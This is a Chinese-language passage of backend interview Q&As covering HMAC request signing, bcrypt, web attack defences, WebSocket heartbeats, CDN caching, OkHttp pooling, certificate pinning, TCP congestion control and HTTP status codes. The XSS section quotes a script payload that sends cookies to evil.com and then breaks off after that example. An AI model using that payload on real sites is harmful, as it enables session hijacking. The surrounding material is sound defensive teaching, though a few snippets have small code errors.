接口签名验证的目的：防止请求在传输过程中被篡改（即使 HTTPS 保证了传输安全，但签名可以在应用层提供额外的防篡改保护）。

完整方案包含：
1. **请求签名**：客户端用约定的算法对请求参数签名
2. **防重放**：加入时间戳 + 随机数（nonce）
3. **签名验证**：服务端验证签名一致性

**📦 实际例子：**

```java
/**
 * 接口签名工具类
 * 签名规则：sign = HmacSHA256(appKey + timestamp + nonce + sortedParams, appSecret)
 */
public class ApiSignatureUtil {

    /**
     * 生成签名
     */
    public static String sign(Map<String, String> params, String appKey,
                               String appSecret, String timestamp, String nonce) throws Exception {
        // 1. 参数排序并拼接
        StringBuilder sb = new StringBuilder();
        sb.append(appKey);
        sb.append(timestamp);
        sb.append(nonce);

        // 按 key 字母排序
        params.entrySet().stream()
            .sorted(Map.Entry.comparingByKey())
            .forEach(e -> {
                if (e.getValue() != null && !e.getValue().isEmpty()) {
                    sb.append(e.getKey()).append("=").append(e.getValue()).append("&");
                }
            });

        String content = sb.toString();

        // 2. HMAC-SHA256 签名
        Mac mac = Mac.getInstance("HmacSHA256");
        SecretKeySpec secretKeySpec = new SecretKeySpec(
            appSecret.getBytes("UTF-8"), "HmacSHA256");
        mac.init(secretKeySpec);
        byte[] signBytes = mac.doFinal(content.getBytes("UTF-8"));

        // 3. 转为十六进制
        StringBuilder hexString = new StringBuilder();
        for (byte b : signBytes) {
            hexString.append(String.format("%02x", b));
        }
        return hexString.toString();
    }

    /**
     * 服务端验证签名（在拦截器中使用）
     */
    public static boolean verify(HttpServletRequest request, String appSecret) throws Exception {
        String appKey = request.getHeader("X-App-Key");
        String timestamp = request.getHeader("X-Timestamp");
        String nonce = request.getHeader("X-Nonce");
        String signature = request.getHeader("X-Signature");

        // 1. 检查时间戳（防重放，允许5分钟误差）
        long requestTime = Long.parseLong(timestamp);
        long now = System.currentTimeMillis() / 1000;
        if (Math.abs(now - requestTime) > 300) {
            throw new SecurityException("请求已过期");
        }

        // 2. 检查 nonce 是否已使用（Redis 去重）
        // String nonceKey = "nonce:" + appKey + ":" + nonce;
        // if (!redisTemplate.opsForValue().setIfAbsent(nonceKey, "1", 5, TimeUnit.MINUTES)) {
        //     throw new SecurityException("重复的请求");
        // }

        // 3. 提取所有请求参数
        Map<String, String> params = new TreeMap<>();
        request.getParameterMap().forEach((k, v) -> params.put(k, v[0]));

        // 4. 重新计算签名并比较
        String expectedSign = sign(params, appKey, appSecret, timestamp, nonce);
        return MessageDigest.isEqual(
            signature.getBytes("UTF-8"),
            expectedSign.getBytes("UTF-8")
        );
    }
}
```

**🔍 源码解析：**

`javax.crypto.Mac`（HMAC 算法）的实现：

```java
// Mac.getInstance("HmacSHA256")
// → SunJCE Provider → com.sun.crypto.provider.HmacSHA256
//
// HMAC（Hash-based Message Authentication Code）算法：
// HMAC(K, m) = H((K' ⊕ opad) || H((K' ⊕ ipad) || m))
// 其中：
//   K' = 密钥填充到块长度（SHA-256 块长度 = 64 字节）
//   opad = 0x5c 重复块长度次
//   ipad = 0x36 重复块长度次
//   H = SHA-256
//   || = 拼接
//
// 本质：对密钥和消息做两次哈希，确保：
// 1. 不知道密钥就无法伪造签名
// 2. 消息被篡改后签名验证失败
```

**⚠️ 常见坑/加分回答：**
- 签名算法的拼接顺序必须客户端和服务端完全一致，否则签名验证失败
- 时间戳防重放窗口不要太大（建议 5 分钟内），否则攻击窗口太大
- Nonce 必须在服务端去重（通常用 Redis SETNX + TTL）
- 签名比较必须用 `MessageDigest.isEqual()`（常量时间比较），不能用 `String.equals()`
- 面试加分：可以对比微信支付的签名方案和支付宝的签名方案，微信支付用 HMAC-SHA256，支付宝用 RSA2（SHA256withRSA）

## 第六系列：密码存储与安全攻防

### 第19集：密码加密存储的最佳方案是什么？

**💡 核心回答：**

密码存储的核心原则：**永远不要存储明文密码，也尽量不存储可逆的密文**。

方案演进：

| 方案 | 安全性 | 说明 |
|---|---|---|
| 明文存储 | ❌ 极差 | 数据库泄漏 = 全部密码泄漏 |
| MD5 哈希 | ❌ 差 | 彩虹表秒破，且 MD5 碰撞已被破解 |
| MD5 + 固定盐 | ❌ 差 | 固定盐 = 没加盐，彩虹表可定制 |
| MD5 + 随机盐 | ⚠️ 一般 | 防止通用彩虹表，但 MD5 计算太快，GPU 暴力破解仍然可行 |
| SHA-256 + 随机盐 | ⚠️ 一般 | 同上，SHA-256 虽然比 MD5 慢，但 GPU 上仍然很快 |
| **bcrypt** | ✅ 推荐 | 自适应成本因子，故意很慢，GPU 不友好 |
| **scrypt** | ✅ 推荐 | 内存密集型，GPU/ASIC 不友好 |
| **Argon2** | ✅ 最佳 | 2015 密码哈希竞赛冠军，同时抗 GPU 和 ASIC |

**📦 实际例子：**

使用 Spring Security 的 BCryptPasswordEncoder：

```java
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

// Spring Boot 配置
@Configuration
public class SecurityConfig {
    @Bean
    public PasswordEncoder passwordEncoder() {
        // strength 默认10，范围4-31，每增加1计算时间翻倍
        // 10 → 约 100ms，推荐值
        return new BCryptPasswordEncoder(10);
    }
}

// 用户注册
@Service
public class UserService {
    @Autowired
    private PasswordEncoder passwordEncoder;
    @Autowired
    private UserRepository userRepository;

    public void register(String username, String rawPassword) {
        // BCrypt 自动生成随机盐并嵌入到哈希结果中
        String encodedPassword = passwordEncoder.encode(rawPassword);
        // 结果格式：$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZfL1cYKxW
        //          版本  成本因子  盐值(22字符)                    哈希值(31字符)

        User user = new User();
        user.setUsername(username);
        user.setPassword(encodedPassword); // 存储到数据库
        userRepository.save(user);
    }

    // 用户登录验证
    public boolean login(String username, String rawPassword) {
        User user = userRepository.findByUsername(username);
        if (user == null) return false;

        // matches() 会从存储的哈希中提取盐值，重新计算并比较
        return passwordEncoder.matches(rawPassword, user.getPassword());
    }
}
```

如果使用独立的 bcrypt 库：

```xml
<!-- pom.xml -->

    <groupId>org.mindrot</groupId>
    <artifactId>jbcrypt</artifactId>
    <version>0.4</version>
</dependency>
```

```java
import org.mindrot.jbcrypt.BCrypt;

// 生成哈希（自动包含随机盐）
String hashed = BCrypt.hashpw("MyP@ssw0rd!", BCrypt.gensalt(12));
// $2a$12$...  12 = 成本因子

// 验证
boolean matches = BCrypt.checkpw("MyP@ssw0rd!", hashed);
```

**🔍 源码解析：**

BCrypt 的工作原理：

```
BCrypt 基于 Blowfish 密码算法，核心流程：
1. 密钥调度（EksBlowfishSetup）：
   - 使用密码 + 盐值初始化 Blowfish 的 P 数组和 S 盒
   - 进行 2^cost 轮扩展密钥调度（这是故意做得很慢的部分）
   - cost=10 时，进行 1024 轮；cost=12 时，进行 4096 轮
2. 加密固定文本 "OrpheanBeholderScryDoubt"（64字节）64次
3. 输出 184 位的结果，编码为 $2a$cost$salt$hash 格式

关键：Blowfish 的 S 盒是 4KB 的数据结构，
     每次计算都需要访问内存中的 S 盒，
     这使得 GPU 并行计算时受限于内存带宽，无法充分发挥并行优势。
     这就是 bcrypt 抗 GPU 攻击的原理。
```

**⚠️ 常见坑/加分回答：**
- BCrypt 的输出长度固定为 60 字符，数据库字段建议 `VARCHAR(255)` 以兼容未来算法升级
- BCrypt 有最大输入长度限制（72 字节），如果密码超过 72 字节，先 SHA-256 再 BCrypt
- Spring Security 的 `PasswordEncoder` 接口支持算法升级：` DelegatingPasswordEncoder` 可以根据前缀 `{bcrypt}`、`{sha256}` 自动选择算法
- 面试加分：Argon2 在 BCrypt 的基础上增加了内存 hardness（需要大量内存），是目前最抗 ASIC 攻击的方案

### 第20集：常见网络攻击（XSS/CSRF/SQL注入/DDoS）及防御方案？

**💡 核心回答：**

| 攻击类型 | 攻击原理 | 防御方案 |
|---|---|---|
| XSS | 注入恶意脚本到网页 | 输入过滤、输出编码、CSP |
| CSRF | 利用用户已登录的身份发起恶意请求 | CSRF Token、SameSite Cookie |
| SQL 注入 | 拼接 SQL 语句时注入恶意 SQL | 参数化查询、ORM |
| DDoS | 大量请求耗尽服务器资源 | WAF、限流、CDN |

**📦 实际例子：**

**XSS 防御：**

```java
// 错误：直接输出用户输入
// response.getWriter().write("Hello, " + username);
// 攻击者输入: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

### 第21集：WebSocket 长连接心跳保活怎么实现？

**💡 核心回答：**

WebSocket 是全双工的持久连接，但实际网络环境中连接可能被静默断开：
- NAT 超时（路由器/防火墙会在一定时间无数据后丢弃连接映射）
- 运营商中间设备超时
- 手机端网络切换（WiFi ↔ 4G）

心跳保活的目的：定期发送小数据包，保持连接活跃，同时检测连接是否还活着。

**📦 实际例子：**

Spring Boot + Netty 实现 WebSocket 心跳：

```java
// 服务端：使用 Netty 的 IdleStateHandler 检测空闲
public class WebSocketServerInitializer extends ChannelInitializer<SocketChannel> {
    @Override
    protected void initChannel(SocketChannel ch) {
        ChannelPipeline pipeline = ch.pipeline();
        
        // 空闲检测：读空闲60秒触发（客户端心跳间隔30秒，留2倍余量）
        pipeline.addLast(new IdleStateHandler(60, 0, 0, TimeUnit.SECONDS));
        pipeline.addLast(new HttpServerCodec());
        pipeline.addLast(new HttpObjectAggregator(65536));
        pipeline.addLast(new WebSocketServerProtocolHandler("/ws"));
        pipeline.addLast(new HeartbeatHandler());    // 心跳处理
        pipeline.addLast(new BusinessHandler());     // 业务处理
    }
}

// 心跳处理器
public class HeartbeatHandler extends ChannelInboundHandlerAdapter {
    @Override
    public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {
        if (evt instanceof IdleStateEvent) {
            IdleStateEvent event = (IdleStateEvent) evt;
            if (event.state() == IdleState.READER_IDLE) {
                // 60秒没收到客户端消息 → 认为连接已断开
                System.out.println("客户端超时未响应，关闭连接: " + ctx.channel().remoteAddress());
                ctx.close();
            }
        } else {
            super.userEventTriggered(ctx, evt);
        }
    }
}
```

客户端心跳（浏览器端）：

```javascript
// 客户端 WebSocket 心跳实现
class WebSocketHeartbeat {
    constructor(url) {
        this.ws = null;
        this.url = url;
        this.heartbeatInterval = 30000; // 30秒发一次心跳
        this.reconnectInterval = 5000;  // 断线重连间隔
        this.heartbeatTimer = null;
    }

    connect() {
        this.ws = new WebSocket(this.url);

        this.ws.onopen = () => {
            console.log('WebSocket 连接成功');
            this.startHeartbeat();
        };

        this.ws.onmessage = (event) => {
            if (event.data === 'pong') return; // 心跳响应，忽略
            // 处理业务消息...
        };

        this.ws.onclose = () => {
            console.log('WebSocket 连接断开');
            this.stopHeartbeat();
            this.reconnect(); // 自动重连
        };

        this.ws.onerror = () => {
            this.ws.close(); // 触发 onclose
        };
    }

    startHeartbeat() {
        this.heartbeatTimer = setInterval(() => {
            if (this.ws.readyState === WebSocket.OPEN) {
                this.ws.send('ping'); // 发送心跳
            }
        }, this.heartbeatInterval);
    }

    stopHeartbeat() {
        if (this.heartbeatTimer) {
            clearInterval(this.heartbeatTimer);
        }
    }

    reconnect() {
        setTimeout(() => {
            console.log('尝试重新连接...');
            this.connect();
        }, this.reconnectInterval);
    }
}

// 使用
const ws = new WebSocketHeartbeat('wss://chat.example.com/ws');
ws.connect();
```

- WebSocket 的 `ping/pong` 帧是协议层面定义的（RFC 6455），但很多实现选择在应用层发文本 `"ping"`/`"pong"`，更灵活
- 面试加分：WebSocket 连接数 = 服务器内存 + 文件描述符，Netty 的单线程可以处理 10 万+ 连接，但需要调整 OS 的 `ulimit -n` 和 TCP 参数

### 第22集：CDN 缓存策略是什么？和源站怎么配合？

**💡 核心回答：**

CDN（Content Delivery Network）通过在全球部署边缘节点，将内容缓存到离用户最近的节点，减少回源请求，加速访问。

缓存策略涉及两个层面：
1. **HTTP 缓存头**：控制浏览器和 CDN 节点的缓存行为
2. **CDN 配置**：缓存规则、回源策略、刷新机制

**📦 实际例子：**

HTTP 缓存头的配置和含义：

```
HTTP/1.1 200 OK
Cache-Control: public, max-age=3600, s-maxage=86400
ETag: "abc123"
Last-Modified: Mon, 01 Jan 2024 00:00:00 GMT

字段解释：
- Cache-Control: public     → 允许浏览器和中间缓存（CDN）都缓存
- max-age=3600              → 浏览器缓存有效期 1 小时
- s-maxage=86400            → CDN 缓存有效期 24 小时（覆盖 max-age）
- ETag                      → 资源的唯一标识（通常是文件内容的哈希）
- Last-Modified             → 资源最后修改时间
```

**缓存请求流程：**

```
场景1：CDN 命中（强缓存）
  用户 → CDN 节点 → 缓存未过期 → 直接返回（304 或直接 200）

场景2：CDN 未命中，回源
  用户 → CDN 节点 → 缓存过期/无缓存 → 回源站获取 → 缓存并返回

场景3：协商缓存
  用户 → CDN → 缓存过期但需要验证 → 
  CDN → 源站（带 If-None-Match: "abc123"）→
  源站：文件没变 → 304 Not Modified → CDN 更新缓存时间
  源站：文件变了 → 200 + 新内容 → CDN 缓存新内容
```

Nginx 配置缓存头：

```nginx
server {
    # 静态资源：强缓存1年（文件名带 hash，内容变了文件名就变了）
    location /static/ {
        add_header Cache-Control "public, max-age=31536000, immutable";
    }

    # HTML 文件：不缓存（总是获取最新版本）
    location / {
        add_header Cache-Control "no-cache";
        # no-cache 不是"不缓存"，而是"每次都和服务器协商验证"
        # 要完全不缓存用 "no-store"
    }

    # API 接口：不缓存
    location /api/ {
        add_header Cache-Control "no-store";
    }
}
```

**🔍 源码解析：**

Spring Boot 中配置静态资源缓存：

```java
@Configuration
public class WebConfig implements WebMvcConfigurer {
    @Override
    public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler("/static/**")
            .addResourceLocations("classpath:/static/")
            .setCacheControl(CacheControl
                .maxAge(365, TimeUnit.DAYS)
                .cachePublic());
        
        // Spring Boot 2.x+ 支持版本化资源 URL
        // 自动将 /static/js/app.js → /static/js/app-a1b2c3d4.js
        registry.addResourceHandler("/static/**")
            .addResourceLocations("classpath:/static/")
            .setCacheControl(CacheControl.maxAge(365, TimeUnit.DAYS))
            .resourceChain(true)
            .addResolver(new VersionResourceResolver()
                .addContentVersionStrategy("/**"));
    }
}
```

`VersionResourceResolver` 的原理：计算文件内容的 MD5/SHA1 作为版本号，嵌入文件名。文件内容不变 → 文件名不变 → CDN/浏览器命中缓存。文件内容变了 → 文件名变了 → 新请求一定 miss 缓存，获取新文件。

**⚠️ 常见坑/加分回答：**
- `Cache-Control: no-cache` 不是"不缓存"！它的意思是"缓存但每次使用前需要验证"。`no-store` 才是"完全不缓存"
- CDN 缓存刷新：内容更新后需要主动刷新 CDN 缓存（通过 CDN 控制台 API 或自动化工具）
- `Vary: Accept-Encoding` 头很重要：告诉 CDN 按 `Accept-Encoding` 区分缓存，否则 gzip 版本可能被发给不支持 gzip 的客户端
- 面试加分：CDN 的边缘计算（Edge Computing）可以在 CDN 节点上执行业务逻辑（如 Cloudflare Workers），实现就近计算

### 第23集：OkHttp 的连接池是怎么实现的？

**💡 核心回答：**

HTTP 长连接（Keep-Alive）允许在同一个 TCP 连接上发送多个请求，避免每次都进行 TCP 三次握手和 TLS 握手。OkHttp 通过 `ConnectionPool` 管理连接复用。

**📦 实际例子：**

```java
// OkHttp 连接池配置
OkHttpClient client = new OkHttpClient.Builder()
    .connectionPool(new ConnectionPool(
        5,                    // 最大空闲连接数
        5,                    // 空闲连接存活时间
        TimeUnit.MINUTES
    ))
    .connectTimeout(10, TimeUnit.SECONDS)   // TCP 连接超时
    .readTimeout(30, TimeUnit.SECONDS)      // 读取超时
    .writeTimeout(30, TimeUnit.SECONDS)     // 写入超时
    .build();

// 两次请求到同一个域名，第二次复用连接
Response response1 = client.newCall(
    new Request.Builder().url("https://api.example.com/users").build()
).execute();
response1.close(); // 必须关闭 response，连接才能归还到连接池

Response response2 = client.newCall(
    new Request.Builder().url("https://api.example.com/orders").build()
).execute();
// 第二次请求复用了第一次的 TCP 连接（同一域名、同一 IP、端口相同）
```

**🔍 源码解析：**

`ConnectionPool` 的核心实现：

```java
// OkHttp 源码：okhttp3.ConnectionPool
public final class ConnectionPool {
    // 内部使用 Deque（双端队列）存储连接
    private final Deque<RealConnection> connections = new ArrayDeque<>();
    
    // 清理任务：定期清理过期连接
    private final Runnable cleanupRunnable = () -> {
        while (true) {
            long waitDuration = cleanup(System.nanoTime());
            if (waitDuration == -1) return; // 连接池为空
            // 等待到下一个需要清理的时间点
            Internal.instance.wait(this, waitDuration);
        }
    };

    /**
     * 获取可复用的连接
     */
    RealConnection get(Address address, StreamAllocation streamAllocation) {
        // 遍历连接池，找到匹配的连接
        for (RealConnection connection : connections) {
            // 匹配条件：同一个地址（IP + 端口 + 代理 + SSL配置 等）
            if (connection.route().address().equals(address)
                && !connection.noNewStreams  // 连接没有被标记为不可复用
                && connection.isHealthy(...)) { // 连接仍然健康
                return connection;
            }
        }
        return null; // 没有可复用的连接，需要新建
    }

    /**
     * 连接归还（response.close() 后触发）
     */
    void put(RealConnection connection) {
        if (connections.isEmpty()) {
            // 启动清理任务
            executor.execute(cleanupRunnable);
        }
        connections.add(connection);
    }

    /**
     * 清理过期连接
     */
    long cleanup(long now) {
        int idleConnectionCount = 0;
        RealConnection longestIdleConnection = null;
        long longestIdleDuration = Long.MIN_VALUE;

        for (RealConnection connection : connections) {
            // 正在被使用的连接跳过
            if (pruneAndGetAllocationCount(connection, now) > 0) {
                continue;
            }
            idleConnectionCount++;
            long idleDuration = now - connection.idleAtNanos;

            // 超过存活时间的连接直接移除
            if (idleDuration > keepAliveDuration) {
                connections.remove(connection);
                continue;
            }

            // 记录空闲时间最长的连接
            if (idleDuration > longestIdleDuration) {
                longestIdleDuration = idleDuration;
                longestIdleConnection = connection;
            }
        }

        // 如果空闲连接数超过上限，移除空闲最久的
        if (idleConnectionCount > maxIdleConnections) {
            connections.remove(longestIdleConnection);
            Util.closeQuietly(longestIdleConnection.socket());
        }

        // 返回下次清理的等待时间
        ...
    }
}
```

**⚠️ 常见坑/加分回答：**
- 必须调用 `response.close()` 或读取完 response body，否则连接不会归还到连接池（连接泄漏）
- HTTP/2 的连接复用更高效：一个 TCP 连接可以承载多个 Stream，不存在 HTTP/1.1 的"连接数限制"问题
- OkHttp 默认连接池：5 个空闲连接，存活 5 分钟
- 面试加分：OkHttp 的连接池只对相同 `Address`（IP+端口+代理+SSL）的连接做复用，如果 DNS 返回多个 IP，不同 IP 的连接不能复用

### 第24集：HTTPS 抓包原理是什么？如何防御中间人攻击？

**💡 核心回答：**

HTTPS 抓包工具（如 Charles、Fiddler、mitmproxy）本质上就是**中间人攻击（MITM）**，原理：

```
正常 HTTPS 通信：
客户端 ←→ 服务器（双方通过 CA 证书验证身份）

抓包工具的中间人：
客户端 ←→ 抓包代理 ←→ 服务器
         ↑
    伪造证书欺骗客户端
```

**抓包流程：**
1. 在客户端设备上安装抓包工具的根证书（信任它）
2. 客户端请求 `https://api.example.com`
3. 抓包代理拦截请求，用根证书**动态签发**一张 `api.example.com` 的假证书
4. 客户端验证假证书 → 发现签发者是抓包工具的根证书 → 已在信任列表中 → 验证通过
5. 抓包代理同时维护两条 TLS 连接：一条与客户端，一条与服务端
6. 所有数据在抓包代理处解密、记录、再加密转发

**防御方案：**

```java
/**
 * 方案1：证书绑定（Certificate Pinning）
 * 客户端只信任特定证书或公钥，不信任系统 TrustStore
 */
// OkHttp CertificatePinner 配置
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add("api.example.com",
        "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=") // 证书公钥的 SHA-256 哈希
    .add("api.example.com",
        "sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=") // 备用公钥
    .build();

OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(certificatePinner)
    .build();

// 即使设备安装了抓包工具的根证书，CertificatePinner 也会检查
// 服务端证书的公钥哈希是否在白名单中 → 不在 → 连接失败
// java.net.UnknownServiceException: Certificate pinning failure!
```

```java
/**
 * 方案2：自定义 TrustManager，只信任特定 CA
 */
public class PinningTrustManager implements X509TrustManager {
    private final X509TrustManager defaultTm;
    private final String expectedIssuer; // 预期的 CA 颁发者

    public PinningTrustManager() throws Exception {
        TrustManagerFactory tmf = TrustManagerFactory.getInstance(
            TrustManagerFactory.getDefaultAlgorithm());
        tmf.init((KeyStore) null); // 使用系统默认 TrustStore
        for (TrustManager tm : tmf.getTrustManagers()) {
            if (tm instanceof X509TrustManager) {
                defaultTm = (X509TrustManager) tm;
                break;
            }
        }
    }

    @Override
    public void checkServerTrusted(X509Certificate[] chain, String authType)
            throws CertificateException {
        // 1. 标准证书链验证
        defaultTm.checkServerTrusted(chain, authType);

        // 2. 额外验证：检查证书颁发者是否是预期的 CA
        X509Certificate serverCert = chain[0];
        String issuer = serverCert.getIssuerX500Principal().getName();
        if (!issuer.contains(expectedIssuer)) {
            throw new CertificateException("Unexpected certificate issuer: " + issuer);
        }
    }

    @Override
    public void checkClientTrusted(X509Certificate[] chain, String authType)
            throws CertificateException {
        defaultTm.checkClientTrusted(chain, authType);
    }

    @Override
    public X509Certificate[] getAcceptedIssuers() {
        return defaultTm.getAcceptedIssuers();
    }
}
```

**⚠️ 常见坑/加分回答：**
- Certificate Pinning 的缺点：证书更新时需要 App 发版更新公钥哈希（建议保留至少2个公钥：当前 + 备用）
- 有些 App 使用双向认证（mTLS）：不仅客户端验证服务端，服务端也验证客户端证书。这样即使被抓包也无法通过服务端验证
- Android 7.0+ 默认不信任用户安装的 CA 证书（只信任系统 CA），增加了抓包难度
- 面试加分：SSLKEYLOGFILE 环境变量可以让浏览器/Chrome 将 TLS 会话密钥导出到文件，Wireshark 可以用这个文件解密抓到的 TLS 流量

### 第25集：TCP 的拥塞控制算法有哪些？对实际业务有什么影响？

**💡 核心回答：**

TCP 拥塞控制的目的是：当网络出现拥堵（丢包、延迟增大）时，自动降低发送速率，避免网络崩溃。

核心算法演进：

| 算法 | 年份 | 核心思想 | 适用场景 |
|---|---|---|---|
| Slow Start + Congestion Avoidance | 1988 | 慢启动指数增长，拥塞避免线性增长 | 基础算法 |
| Fast Retransmit + Fast Recovery | 1990 | 收到3个重复ACK立即重传，不等待超时 | 快速恢复 |
| Reno | 1990 | 在基础算法上增加快速重传 | 通用 |
| Cubic | 2002 | 用三次函数控制窗口增长（Linux 默认） | 高带宽网络 |
| BBR | 2016 | 基于带宽和 RTT 估计，而非丢包 | Google 长距离传输 |

**📦 实际例子：**

场景：用户从美国访问中国服务器（高延迟、有丢包）

- **传统 Cubic 算法**：丢包后窗口减半，恢复很慢（线性增长）。一个 RTT=200ms 的连接，恢复发送速率可能需要几秒
- **BBR 算法**：不依赖丢包信号，而是持续探测最大带宽和最小 RTT。在高丢包率场景下性能提升明显

```bash
# Linux 查看和修改拥塞控制算法
sysctl net.ipv4.tcp_congestion_control  # 查看当前算法（通常是 cubic）
sysctl -w net.ipv4.tcp_congestion_control=bbr  # 切换到 BBR

# 需要在 sysctl.conf 中持久化
# net.core.default_qdisc = fq
# net.ipv4.tcp_congestion_control = bbr
```

**对业务的影响：**
- **大文件上传**：拥塞控制直接影响上传速度。弱网环境下 Cubic 的吞吐量可能只有 BBR 的 1/10
- **直播/视频**：BBR 的带宽探测机制更适合实时流媒体
- **短连接 API 调用**：影响不大，因为主要瓶颈在 RTT 而非拥塞窗口

**⚠️ 常见坑/加分回答：**
- BBR 需要内核 4.9+ 支持，且需要配合 `fq`（Fair Queueing）队列调度算法
- 面试加分：Google 公开论文指出 BBR 在 YouTube 和 Google 跨大西洋链路上将吞吐量提升了 27 倍
- TCP 拥塞控制是操作系统内核层面的，Java 应用代码无法直接干预，但可以通过 Socket 参数（如 `SO_SNDBUF`）间接影响

### 第26集：如何设计一个安全的 API 网关认证方案？

**💡 核心回答：**

API 网关认证需要解决：身份认证、请求防篡改、防重放、权限控制。

**📦 实际例子：**

```java
/**
 * API 网关认证方案
 * 请求头：
 *   X-App-Key: app_001           ← 应用标识
 *   X-Timestamp: 1700000000      ← 请求时间戳（秒）
 *   X-Nonce: random_string       ← 随机串（防重放）
 *   X-Signature: hmac_sha256     ← 请求签名
 *   Authorization: Bearer <JWT>  ← 用户身份（可选，公开接口不需要）
 */

// 网关层：签名验证 + 限流
@Component
public class ApiGatewayFilter implements HandlerInterceptor {

    @Autowired
    private AppKeyRepository appKeyRepository;  // 存储每个应用的 appKey/appSecret
    @Autowired
    private StringRedisTemplate redisTemplate;

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response,
                             Object handler) throws Exception {
        String appKey = request.getHeader("X-App-Key");
        String timestamp = request.getHeader("X-Timestamp");
        String nonce = request.getHeader("X-Nonce");
        String signature = request.getHeader("X-Signature");

        // 1. 基础校验
        if (StringUtils.isAnyBlank(appKey, timestamp, nonce, signature)) {
            sendError(response, 401, "Missing auth headers");
            return false;
        }

        // 2. 时间戳校验（±5分钟）
        long ts = Long.parseLong(timestamp);
        if (Math.abs(System.currentTimeMillis() / 1000 - ts) > 300) {
            sendError(response, 401, "Request expired");
            return false;
        }

        // 3. Nonce 防重放（Redis SETNX，TTL 10分钟）
        String nonceKey = "api:nonce:" + appKey + ":" + nonce;
        Boolean set = redisTemplate.opsForValue().setIfAbsent(
            nonceKey, "1", Duration.ofMinutes(10));
        if (!Boolean.TRUE.equals(set)) {
            sendError(response, 401, "Duplicate request");
            return false;
        }

        // 4. 查询 appSecret
        AppKey appKeyEntity = appKeyRepository.findByAppKey(appKey);
        if (appKeyEntity == null || !appKeyEntity.isEnabled()) {
            sendError(response, 401, "Invalid app key");
            return false;
        }

        // 5. 签名验证
        Map<String, String> params = extractParams(request);
        String expectedSign = ApiSignatureUtil.sign(
            params, appKey, appKeyEntity.getAppSecret(), timestamp, nonce);
        if (!MessageDigest.isEqual(
                signature.getBytes("UTF-8"),
                expectedSign.getBytes("UTF-8"))) {
            sendError(response, 401, "Invalid signature");
            return false;
        }

        // 6. 限流（基于 appKey，每秒 100 次）
        // ... Redis + Lua 滑动窗口限流

        return true;
    }
}
```

**⚠️ 常见坑/加分回答：**
- AppSecret 的存储：不能明文存在数据库，应该加密存储或通过 KMS 动态获取
- 签名算法的拼接规则必须文档化，并提供 SDK 给调用方
- 区分公开接口和需要用户身份的接口：公开接口只验签，登录接口需要额外的 JWT/OAuth 认证
- 面试加分：OAuth 2.0 + JWT 组合方案 —— OAuth 管授权流程（颁发 Token），JWT 管身份传递（Token 自包含用户信息）

### 第27集：HTTP 的状态码有哪些？实际项目中如何设计？

**💡 核心回答：**

常用状态码分类：

| 范围 | 含义 | 常用状态码 |
|---|---|---|
| 2xx | 成功 | 200 OK, 201 Created, 204 No Content |
| 3xx | 重定向 | 301 永久重定向, 302 临时重定向, 304 Not Modified |
| 4xx | 客户端错误 | 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 429 Too Many Requests |
| 5xx | 服务端错误 | 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable |

**📦 实际例子：**

```java
// Spring Boot 中正确使用状态码
@RestController
public class UserController {

    @PostMapping("/users")
    @ResponseStatus(HttpStatus.CREATED) // 201
    public User createUser(@Valid @RequestBody CreateUserRequest request) {
        return userService.create(request);
    }

    @GetMapping("/users/{id}")
    public User getUser(@PathVariable Long id) {
        return userService.findById(id)
            .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND, "用户不存在"));
    }

    @DeleteMapping("/users/{id}")
    @ResponseStatus(HttpStatus.NO_CONTENT) // 204，无返回体
    public void deleteUser(@PathVariable Long id) {
        userService.delete(id);
    }
}

// 全局异常处理
@RestControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(BusinessException.class)
    public ResponseEntity<ErrorResponse> handleBusinessException(BusinessException e) {
        return ResponseEntity
            .status(e.getHttpStatus()) // 业务异常对应的 HTTP 状态码
            .body(new ErrorResponse(e.getCode(), e.getMessage()));
    }

    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ResponseEntity<ErrorResponse> handleValidation(MethodArgumentNotValidException e) {
        String message = e.getBindingResult().getFieldErrors().stream()
            .map(f -> f.getField() + ": " + f.getDefaultMessage())
            .collect(Collectors.joining(", "));
        return ResponseEntity
            .status(HttpStatus.BAD_REQUEST) // 400
            .body(new ErrorResponse("VALIDATION_ERROR", message));
    }
}
```

**⚠️ 常见坑/加分回答：**
- 401 vs 403：401 是"未认证"（没有登录），403 是"已认证但没权限"
- 204 No Content：DELETE 操作成功时返回 204（没有返回体），而不是 200
- 301 vs 302：301 会被浏览器永久缓存，后续请求直接访问新地址；302 是临时重定向
- 面试加分：RESTful API 设计中，状态码应该准确反映操作结果，不要所有成功都返回 200 + `{"code": 500, "msg": "error"}`

### 第28集：ARP 协议是什么？IP 和 MAC 地址有什么关系？

**💡 核心回答：**

ARP（Address Resolution Protocol）将 IP 地址解析为 MAC 地址，工作在**网络层和数据链路层之间**。

当一台机器要和另一台机器通信时：
1. 知道目标 IP 地址
2. 需要知道目标 MAC 地址才能构造以太网帧
3. 通过 ARP 协议获取 MAC 地址

**ARP 解析过程：**
```
主机 A 要和主机 B（192.168.1.100）通信：
1. 检查自己的 ARP 缓存表 → 有 B 的 MAC 地址 → 直接通信
2. ARP 缓存没有 → 发送 ARP 广播请求："谁有 192.168.1.100？请告诉 192.168.1.50"
3. 主机 B 收到广播 → 回复 ARP 单播响应："我是 192.168.1.100，我的 MAC 是 aa:bb:cc:dd:ee:ff"
4. 主机 A 缓存 B 的 IP-MAC 映射（TTL 通常 2-10 分钟）
```

**📦 实际例子：**

```bash
# 查看本机 ARP 缓存
arp -a

# 输出示例：
# ? (192.168.1.1) at aa:bb:cc:dd:ee:01 [ether] on eth0  ← 网关的 MAC
# ? (192.168.1.100) at aa:bb:cc:dd:ee:64 [ether] on eth0

# 跨网段通信：ARP 只能解析同一局域网内的 MAC
